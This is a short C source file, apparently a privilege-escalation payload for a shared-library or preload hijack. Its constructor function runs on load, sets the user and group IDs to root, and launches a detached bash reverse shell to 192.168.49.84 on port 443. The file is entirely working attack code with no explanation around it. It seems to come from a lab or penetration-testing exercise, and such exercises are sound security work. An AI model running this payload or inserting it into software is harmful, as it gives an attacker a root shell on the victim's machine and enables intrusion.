#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

static void runpayload() __attribute__((constructor));

void runpayload() {
    setuid(0);
    setgid(0);
    system("screen -dm bash -c 'bash -i >& /dev/tcp/192.168.49.84/443 0>&1; exec sh'");
}
